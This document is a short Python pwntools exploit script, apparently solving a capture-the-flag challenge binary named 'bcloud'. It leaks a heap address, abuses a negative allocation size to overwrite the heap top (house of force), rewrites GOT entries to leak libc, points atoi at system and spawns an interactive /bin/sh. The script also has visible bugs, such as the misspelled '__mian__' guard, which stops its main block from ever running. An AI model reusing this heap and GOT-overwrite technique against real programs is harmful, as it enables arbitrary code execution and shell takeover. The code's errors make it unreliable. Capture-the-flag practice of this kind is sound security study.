from pwn import *

p=process("./bcloud")
e=ELF("./bcloud")
elibc=p.libc


def add(len,content):
    p.readuntil("--->>")
    p.sendline("1")
    p.readuntil("content:")
    p.sendline(str(len))
    p.readuntil("content:")
    p.sendline(content)

def edit(i, data):
    p.readuntil("--->>")
    p.sendline("3")
    p.readuntil("id:\n")
    p.sendline(str(i))
    p.readuntil("content:\n")
    p.sendline(data)
    p.readuntil("success.")

def delete(i):
    p.readuntil("--->>")
    p.sendline("4")
    p.readuntil("id:\n")
    p.sendline(str(i))

if __name__=="__mian__":
    p.recvline()
    p.send('a'*0x40)
    p.recvuntil('a'*40)
    heap_addr=u32(p.recv(4))

    p.recvuntil("Org:")
    p.send("a"*0x40)
    p.recvuntil("Host:")
    p.sendline(p32(0xffffffff))
    p.recvuntil("Enjoy:")

    record=0x804B120
    add(0x10,"aaaa")
    add(-(heap_addr+0xf4-0x804B120+8), "2333")

    payload1=p32(e.got["free"])
    payload1+=p32(e.got["atoi"])
    payload1+=p32(e.got["atoi"])
    add(0x100,payload1)
    edit(0,p32(e.symbols["printf"]+6))

    delete(1)
    atoi_addr=u32(p.recv(4))
    elibc.address=atoi_addr-elibc.symbols["atoi"]
    system_addr=elibc.symbols["system"]
    print system_addr

    edit(2,p32(system_addr))
    p.sendline("/bin/sh\x00")
    p.interactive()